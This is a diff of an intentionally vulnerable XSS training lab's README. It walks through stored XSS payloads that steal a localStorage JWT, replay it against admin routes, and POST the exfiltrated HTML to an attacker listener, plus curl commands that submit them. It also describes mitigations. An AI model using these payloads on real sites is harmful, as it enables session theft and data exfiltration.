@@ -9,7 +9,8 @@ This repository starts in intentionally vulnerable mode. Use it only in a contro
 1. A public form on `cross.fit` stores attacker-controlled content.
 2. An internal admin panel on `backend.cross.fit` later renders that content.
 3. A privileged browser session can become the bridge to an internal system even when the attacker cannot reach that backend directly.
-4. Mitigations such as contextual output escaping, `HttpOnly`, and CSP reduce or block exploitation.
+4. A JWT stored client-side in the privileged browser can be stolen and then replayed explicitly against protected backend routes.
+5. Mitigations such as contextual output escaping and CSP reduce or block exploitation.
 
 ## Architecture
 
@@ -91,7 +92,8 @@ cp .env.example .env
 Supported variables:
 
 - `LAB_MODE=vulnerable|mitigated`
-- `COOKIE_HTTPONLY=` optional explicit override
+- `JWT_SECRET=` optional explicit override
+- `AUTH_TOKEN_TTL=` optional explicit override
 - `ENABLE_CSP=` optional explicit override
 - `RENDER_UNSAFE_HTML=` optional explicit override
 - `POLL_INTERVAL_SECONDS=20`
@@ -100,11 +102,10 @@ Behavior:
 
 - `vulnerable`:
   - raw HTML rendering enabled
-  - `HttpOnly=false`
+  - internal auth stays as explicit JWT
   - CSP disabled
 - `mitigated`:
   - escaped output enabled
-  - `HttpOnly=true`
   - CSP enabled
 
 ## Start The Lab
@@ -300,7 +301,38 @@ At this point you can state:
 - the privileged browser session attached to `backend.cross.fit` executed the payload
 - this is enough to confirm that the internal panel is vulnerable to stored XSS
 
-### Step 8: prepare a manual listener for raw HTTP requests
+### Step 8: prepare a manual listener for credential theft
+
+At this point the next question is whether the privileged browser stores any reusable credential in JavaScript-accessible storage.
+
+On the attacker machine, start a simple listener for `GET` requests:
+
+```bash
+python3 -m http.server 8000
+```
+
+### Step 9: steal the internal JWT from the worker browser
+
+Submit a payload that reads the JWT from `localStorage` and sends it to the attacker-controlled server:
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:8000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
+```
+
+Same-host variation:
+
+```html
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:8000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
+```
+
+Expected on the attacker machine:
+
+- one incoming `GET /collect`
+- the query string contains `jwt=eyJ...`
+
+This proves that the internal backend is not only vulnerable to stored XSS, but also that its browser-held credential can be stolen.
+
+### Step 10: prepare a raw listener for the next exfiltration step
 
 For the next step you want to receive a `POST` body manually, without using the bundled collector yet.
 
@@ -322,15 +354,15 @@ Expected:
 - when the XSS fires, you will see the full HTTP request
 - the request body will contain the Base64-encoded HTML
 
-### Step 9: exfiltrate the unauthenticated front page of `backend.cross.fit`
+### Step 11: exfiltrate the front page of `backend.cross.fit`
 
-Now submit a payload that fetches the backend front page without sending the admin session cookie, encodes the returned HTML in Base64, and sends it to the attacker listener.
+Now use the XSS to request `/` from the same origin and send the returned HTML to the attacker listener.
 
 Payload:
 
 ```html
 <script>
-fetch('/', { credentials: 'omit' })
+fetch('/')
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
@@ -348,7 +380,7 @@ If attacker and lab are on the same host, use:
 
 ```html
 <script>
-fetch('/', { credentials: 'omit' })
+fetch('/')
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
@@ -362,13 +394,63 @@ fetch('/', { credentials: 'omit' })
 </script>
 ```
 
-Why `credentials: 'omit'` matters:
+Why this now returns the login page:
 
-- the XSS is executing in an authenticated admin session
-- if the payload reused that session, the backend front page could redirect to the dashboard
-- omitting credentials forces the fetch to retrieve the unauthenticated front page instead
+- the privileged worker reaches admin routes by explicitly attaching the JWT as a query parameter
+- that token is not sent automatically by a plain `fetch('/')`
+- because no auth is attached here, the backend responds with its unauthenticated front page
 
-### Step 10: wait for the worker and inspect the raw HTTP request
+Why the rest of the parameters make sense:
+
+- `fetch('/')` targets the current origin, so the request is made to `backend.cross.fit`
+- `r.text()` is used because the target is raw HTML
+- `btoa(unescape(encodeURIComponent(html)))` safely Base64-encodes the returned HTML
+- `method: 'POST'` keeps the Base64 in the request body instead of the URL
+- `mode: 'no-cors'` is enough because the attacker only needs the browser to send the request
+- `Content-Type: 'text/plain'` keeps the body easy to inspect by hand
+
+### Step 11.1: use an external JavaScript file if the message field is too small
+
+If the inline payload is too long for the `message` field, serve the external helper already included in the repo.
+
+Start a static server from the repository root:
+
+```bash
+python3 -m http.server 8000
+```
+
+Served file:
+
+```text
+tools/payload-frontpage-login.js
+```
+
+Minimal stored payload:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js"></script>
+```
+
+Same-host variation:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-login.js"></script>
+```
+
+How this external payload works:
+
+- it derives the attacker host from `document.currentScript.src`
+- it fetches `/`
+- it Base64-encodes the returned HTML
+- it sends the result to `http://same-host:9000/internal-html`
+
+If you need another port or path for the receiver, you can pass it in the script URL:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js?collectPort=9000&collectPath=/internal-html"></script>
+```
+
+### Step 12: wait for the worker and inspect the raw HTTP request
 
 As before, the worker will render the stored message from `/admin/messages/next`.
 
@@ -379,7 +461,7 @@ Expected in the attacker terminal:
 - a blank line
 - the raw Base64 body at the end of the request
 
-### Step 11: decode the Base64 manually and save it as HTML
+### Step 13: decode the Base64 manually and save it as HTML
 
 Copy only the request body, that is, the Base64 content after the blank line, and decode it:
 
@@ -399,7 +481,7 @@ Or inspect it directly:
 rg -n "<title>|<form|username|password" backend-frontpage.html
 ```
 
-### Step 12: validate the expected result
+### Step 14: validate the expected result
 
 The decoded HTML should correspond to the login page of `backend.cross.fit`.
 
@@ -410,9 +492,13 @@ You should find indicators such as:
 - `username`
 - `password`
 
-This demonstrates that the attacker can use the XSS not only to trigger a request, but also to read internal HTML and move that content outside the segmented backend.
+At this stage, you have demonstrated three concrete things:
 
-### Step 13: move to the scripted collector later
+- the backend is reachable indirectly through the privileged browser
+- the privileged browser stores a reusable JWT accessible to JavaScript
+- a plain request to `/` still lands on login unless the attacker explicitly reuses that JWT
+
+### Step 15: move to the scripted collector later
 
 Once this manual capture is understood and demonstrated, you can switch to:
 
@@ -456,13 +542,32 @@ Expected on the attacker machine with `python3 -m http.server 8000`:
 
 The `404` is fine. What matters is that the request reached the attacker-controlled server.
 
+### JWT theft from the privileged browser
+
+Use this after the first probe if you want to confirm that the privileged browser keeps the internal JWT in `localStorage`:
+
+```html
+<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
+```
+
+Same-host validation shortcut:
+
+```html
+<img src=x onerror="new Image().src='http://docker_host_gateway_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')">
+```
+
+Expected in vulnerable mode:
+
+- `collector.py` receives `GET /collect`
+- the query contains `jwt=eyJ...`
+
 ### Backend front page exfiltration in Base64
 
-Use this after the probe request, when you want to retrieve the unauthenticated front page of `backend.cross.fit` and decode it locally:
+Use this after stealing the JWT, when you want to retrieve the unauthenticated front page of `backend.cross.fit` and decode it locally:
 
 ```html
 <script>
-fetch('/', { credentials: 'omit' })
+fetch('/')
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
@@ -480,7 +585,7 @@ Same-host validation shortcut:
 
 ```html
 <script>
-fetch('/', { credentials: 'omit' })
+fetch('/')
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
@@ -500,33 +605,60 @@ Expected:
 - the raw body is Base64
 - decoding it yields the login page HTML of `backend.cross.fit`
 
-### Visual XSS
+### Backend front page exfiltration via external JavaScript
+
+Use this when the `message` field is too short for the inline payload:
 
 ```html
-<script>alert('XSS ejecutado en backend.cross.fit')</script>
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js"></script>
+```
+
+Same-host validation shortcut:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-login.js"></script>
+```
+
+### Protected dashboard exfiltration with explicit JWT
+
+Once you have the stolen JWT, you can replay it explicitly to request `/admin`:
+
+```html
+<script>
+const token = localStorage.getItem('gym_internal_token');
+fetch('/admin', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
 ```
 
 Expected:
 
-- the script executes in the privileged Playwright browser
-- the worker logs the dialog event
+- the returned HTML corresponds to `/admin`
+- the dashboard includes a link to `/admin/messages`
 
-### Cookie theft
-
-```html
-<img src=x onerror="new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)">
-```
-
-Expected in vulnerable mode:
-
-- `collector.py` receives `GET /collect`
-- the query contains `gym_internal_session=...`
-
-### Internal HTML exfiltration
+### Protected message list exfiltration with explicit JWT
 
 ```html
 <script>
-fetch('/admin/messages', { credentials: 'include' })
+const token = localStorage.getItem('gym_internal_token');
+fetch('/admin/messages', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
   .then(r => r.text())
   .then(html => {
     const b64 = btoa(unescape(encodeURIComponent(html)));
@@ -545,6 +677,17 @@ Expected in vulnerable mode:
 - `collector.py` receives `POST /internal-html`
 - the body decodes to the HTML of `/admin/messages`
 
+### Visual XSS
+
+```html
+<script>alert('XSS ejecutado en backend.cross.fit')</script>
+```
+
+Expected:
+
+- the script executes in the privileged Playwright browser
+- the worker logs the dialog event
+
 ## Submit Payloads With curl
 
 ### Legitimate message
@@ -557,14 +700,14 @@ curl -i -X POST http://cross.fit/contact \
   -d "message=Quiero informacion sobre planes mensuales"
 ```
 
-### Cookie payload
+### JWT theft payload
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS" \
   -d "email=xss@example.com" \
   -d "phone=099000000" \
-  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?c='+encodeURIComponent(document.cookie)\">"
+  --data-urlencode "message=<img src=x onerror=\"new Image().src='http://attacker_machine_ip:9000/collect?jwt='+encodeURIComponent(localStorage.getItem('gym_internal_token')||'missing')\">"
 ```
 
 ### Probe request to Python HTTP server
@@ -584,26 +727,36 @@ curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS Frontpage" \
   -d "email=xss-frontpage@example.com" \
   -d "phone=099000011" \
-  --data-urlencode "message=<script>fetch('/', { credentials: 'omit' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
+  --data-urlencode "message=<script>fetch('/').then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
 ```
 
-### HTML exfiltration payload
+### Backend front page exfiltration via external JavaScript
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Frontpage JS" \
+  -d "email=xss-frontpage-js@example.com" \
+  -d "phone=099000013" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-login.js\"></script>"
+```
+
+### `/admin/messages` exfiltration payload with explicit JWT
 
 ```bash
 curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS 2" \
   -d "email=xss2@example.com" \
   -d "phone=099000001" \
-  --data-urlencode "message=<script>fetch('/admin/messages', { credentials: 'include' }).then(r => r.text()).then(html => { const b64 = btoa(unescape(encodeURIComponent(html))); fetch('http://attacker_machine_ip:9000/internal-html', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'text/plain' }, body: b64 }); });</script>"
+  --data-urlencode "message=<script>const token=localStorage.getItem('gym_internal_token');fetch('/admin/messages',{headers:{Authorization:'Bearer '+token}}).then(r=>r.text()).then(html=>{const b64=btoa(unescape(encodeURIComponent(html)));fetch('http://attacker_machine_ip:9000/internal-html',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:b64});});</script>"
 ```
 
 ## Worker Behavior
 
 The worker intentionally behaves like a real privileged user:
 
-1. Opens `http://backend.cross.fit/login`
-2. Logs in as `admin`
-3. Visits `/admin/messages/next`
+1. Requests a JWT from `http://backend.cross.fit/api/login`
+2. Stores that JWT in the privileged browser `localStorage`
+3. Visits `/admin/messages/next?token=...`
 4. Waits for the page to render
 5. Marks the message as processed
 
@@ -639,8 +792,8 @@ LAB_MODE=mitigated docker compose up -d --build internal-app worker
 Mitigated behavior:
 
 - message detail renders escaped content instead of raw HTML
-- session cookie is `HttpOnly`
 - CSP blocks inline scripts and inline event handlers
+- the internal auth model remains explicit JWT, but the XSS sink is no longer executable
 
 ## Validate The Mitigation
 
@@ -654,7 +807,7 @@ Expected:
 
 - the worker still processes the message
 - the payload appears as text in the internal detail view
-- no cookie theft reaches the collector
+- no JWT theft reaches the collector
 - no `/internal-html` POST reaches the collector
 
 ## Shutdown
@@ -670,7 +823,7 @@ This repository intentionally includes:
 - stored attacker-controlled HTML in the public form flow
 - a vulnerable raw HTML sink in the admin detail page when `LAB_MODE=vulnerable`
 - static lab credentials (`admin/admin123`)
-- non-`HttpOnly` session cookies in vulnerable mode
+- a JWT stored in `localStorage` inside the privileged browser
 
 These choices exist only for the lab scenario.
 
@@ -680,8 +833,8 @@ These choices exist only for the lab scenario.
   `https://owasp.org/www-community/attacks/xss/`
 - OWASP XSS Prevention Cheat Sheet:
   `https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html`
-- MDN Cookies / HttpOnly:
-  `https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies`
+- MDN Web Storage API:
+  `https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API`
 - Docker Compose Networking:
   `https://docs.docker.com/compose/how-tos/networking/`
 - Nginx access controls:
